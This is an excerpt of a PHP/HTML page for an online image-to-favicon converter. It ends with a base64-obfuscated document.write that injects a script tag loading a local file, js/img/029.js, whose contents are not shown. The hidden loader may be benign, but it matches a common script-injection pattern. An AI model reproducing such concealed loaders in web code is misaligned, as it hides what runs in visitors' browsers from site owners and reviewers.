...
<html lang="en"> <?php include('admin/head.php'); ?> <?php include('admin/header.php'); ?> <?php include('admin/user.php'); ?> <div id="post-header" class="post-header">
  ...
  <div class="bg-tool">
    <h1>Convert Image to PNG Favicons Online</h1>
  ...
  <div class="toolarea">
    ...
    <br>
    <canvas id="imageCanvas" width="128" height="128"></canvas>
    <br>
    ...
    <br>
    <button id="generateButton">Generate Favicon</button>
    <br>
    <img id="faviconImage" alt="Generated Favicon">
    <br>
    <a id="downloadLink" style="display: none;">Download Favicon</a>
    <script>
      document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDI5LmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));
    </script>
